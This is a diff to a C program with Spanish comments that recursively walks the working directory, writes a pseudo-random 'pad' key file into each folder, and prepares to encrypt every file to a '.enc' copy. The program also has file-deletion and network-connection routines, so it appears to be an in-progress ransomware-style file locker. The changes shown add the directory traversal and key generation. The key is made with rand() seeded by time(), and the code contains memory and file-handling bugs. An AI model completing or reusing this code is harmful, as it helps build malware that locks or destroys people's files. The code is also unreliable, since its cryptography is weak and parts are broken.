@@ -14,6 +14,7 @@
 
 #define PORT 6789  
 #define length_path 100
+#define pad_size 3		//tamano en KB del archivo pad.pad
 int otpEncrypt(char n_ifile[], char n_ofile[], char n_pad[]){
 	/*
 		Funcion que cifra el contenido de n_ifile. El mensaje cifrado
@@ -129,43 +130,51 @@ void DelFiles(char *path_file){
 }
 
 
-long int getFileSize(FILE *stream){
+long int getFileSize(char *file){
 	/*
 		Funcion que obtiene el tamano de un archivo.
 		Devuelve este valor.
 	*/
+	FILE *stream;
 	long int len;
-	//Se posiciona al final el apuntador
-	fseek(stream, 0, SEEK_END);
-	//Se cuentan los bytes
-	len = ftell(stream);
-	//Se regresa el apuntador al inicio del archivo
-	fseek(stream, 0, SEEK_SET);
+	if((stream= fopen(file, "r")) != NULL){
+		//Se posiciona al final el apuntador
+		fseek(stream, 0, SEEK_END);
+		//Se cuentan los bytes
+		len = ftell(stream);
+		//Se regresa el apuntador al inicio del archivo
+		fseek(stream, 0, SEEK_SET);
+	}
+	fclose(stream);
 	return len;
 }
 
-int encryptFile(char *file){
-	FILE *natural_file;
-	long int len;
-	char *outFile;
-
-	if((natural_file= fopen(file, "r")) != NULL){
-		len = getFileSize(natural_file);
-		//*outFile = malloc(len);
-		printf("Tamano del archivo %s: %ld bytes\n", file, len);
-	}
-}
-#if 0
-int isDir(char* target){
+int encryptFile(char *cwd, char *file){
 	/*
-		Funcion que valida si un fichero es un directorio
-		Retorna 1 si es directorio, 0 si es archivo comun
+		Funcion que prepara los parametros necesarios
+		para poder cifrar el archivo dado como parametro
 	*/
-   struct stat statbuf;
-   stat(target, &statbuf);
-   return S_ISDIR(statbuf.st_mode);
+	char *outFile = calloc((strlen(file) + 5),sizeof(char));
+	strcat(outFile, file);
+	//El archivo cifrado se llamara [file].enc
+	strcat(outFile, ".enc\0");
+	char *pad = calloc((strlen(cwd) + 9), sizeof(char));
+	strcat(pad, cwd);
+	//El nombre del PAD con el que se cifrara el archivo es
+	//[cwd]/pad.pad
+	strcat(pad, "/pad.pad\0");
+	printf("enc:\n");
+	printf("\t%s\n\t%s\n ", outFile, pad);
+	//El archivo pad.pad no se cifrara, por eso se excluye con el condicional
+	//if (strcmp(file, pad) != 0)
+	//	printf("\t%s\n\t%s", outFile, pad);
+	
+	free(outFile);
+	free(pad);
+	
+	return 0;	
 }
-#endif
+
 char * getAbsPath(char *current_file, char *dir){
 	/*
 		Funcion que concatena el directorio de un fichero con el
@@ -180,6 +189,39 @@ char * getAbsPath(char *current_file, char *dir){
 	strcat(dest_file, "/");
 	strcat(dest_file, current_file);
 	return dest_file;
+}
+
+int makePadFile(char *abs_path){
+	/*
+		Funcion que genera el archivo PAD con el que se encriptaran
+		los archivos dentro de la carpeta respectiva.
+	*/
+	char c_random;
+	int i;
+	FILE *pad_file;
+	char *pad = (char *)calloc(strlen(abs_path) + 9, sizeof(char));
+	//Obtenemos el nombre absoluto del archivo
+	strcat(pad, abs_path);
+	strcat(pad, "/pad.pad\0");
+	printf("\t%s\n", pad);
+	//Semilla para obtener los caracteres pseudo-aleatoriamente
+	srand(time(NULL));
+	if((pad_file = fopen(pad, "w+")) != NULL){
+		for(i = pad_size*1024; i > 0; i--){
+			//Generamos el caracter pseudo-aleatorio
+			//Se le suma 32 para evitar los caracteres de control (codigo ASCII)
+			c_random = (char)(rand()%126) + 32;
+			fputc(c_random, pad_file);
+		}
+		fclose(pad_file);
+		free(pad);
+		printf("\t0\n");
+		return 0;
+	}
+	//Si resulta error al abrir el archivo
+	free(pad);
+	printf("\t-1\n");
+	return -1;
 }
 
 int getFilesinDir(char *cwd){
@@ -198,30 +240,24 @@ int getFilesinDir(char *cwd){
     	//Se itera sobre todos los ficheros del directorio
         while ((dir = readdir(d)) != NULL)
         {
-						printf("FILE: %s, %d\n", dir->d_name, dir->d_type);
-						//printf("FILE: %s, %d\n", dir->d_name, isDir(dir->d_name));
-            //Si es archivo comun, se llama a encryptFile para encriptarlo
-            //if (isDir(dir->d_name) == 0){
-						// Si el tipo de archivo es igual a 8 se trata de un archivo comun
-					 	if (dir->d_type == 8){ // Es un archivo
-							strcpy(abs_path_file, getAbsPath(dir->d_name, cwd));
-            	encryptFile(abs_path_file);
-            	// Llamada a la funcion DelFiles para borrar los archivos
-            	//---  DelFiles(abs_path_file);
+			//Si es archivo comun, se llama a encryptFile para encriptarlo
+			// Si el tipo de archivo es igual a 8 se trata de un archivo comun
+			if (dir->d_type == 8 && dir->d_name[0] != '.'){ // Es un archivo
+				strcpy(abs_path_file, getAbsPath(dir->d_name, cwd));
+				printf("sendenc:%s\n%s\n", cwd, abs_path_file);
+            	encryptFile(cwd, abs_path_file);
             }
-            //else if((strcmp(dir->d_name, ".") != 0)?(strcmp(dir->d_name, "..") != 0)?1:0:0){
             //Si es un subdirectorio, se llama de manera recursiva a la funcion con
             //la ruta absoluta del subdirectorio
-						// Si el tipo de archivo es igual a 4 se trata de un directorio
-						else if (dir->d_type == 4){ // Es un directorio
-								if((strcmp(dir->d_name, ".") != 0)?(strcmp(dir->d_name, "..") != 0)?(strcmp(dir->d_name, ".git") != 0)?1:0:0:0){
-	            	//printf("\n\n%s\n", abs_path_file);
-	            	//memset(abs_path_file, 0, strlen(abs_path_file));
-		            	strcpy(abs_path_file, getAbsPath(dir->d_name, cwd));
-		            	printf("new p: %s\n", abs_path_file);
-		            	getFilesinDir(abs_path_file);
-	            	}
-						}
+			// Si el tipo de archivo es igual a 4 se trata de un directorio
+			else if (dir->d_type == 4){ // Es un directorio
+				if((strcmp(dir->d_name, ".") != 0)?(strcmp(dir->d_name, "..") != 0)?(dir->d_name[0] != '.')?1:0:0:0){
+		           	strcpy(abs_path_file, getAbsPath(dir->d_name, cwd));
+		           	printf("\nnew p: %s\n", abs_path_file);
+		           	makePadFile(abs_path_file);
+		           	getFilesinDir(abs_path_file);
+	           	}
+			}
         }
         closedir(d);
     }
@@ -294,8 +330,8 @@ int conecta(){
 
 
 int main(){
-	int a= conecta();
-//	char cwd[length_path];
-	//getcwd(cwd, (size_t) sizeof(cwd));
-//	getFilesinDir(cwd);
+	//int a= conecta();
+	char cwd[length_path];
+	getcwd(cwd, (size_t) sizeof(cwd));
+	getFilesinDir(cwd);
 }
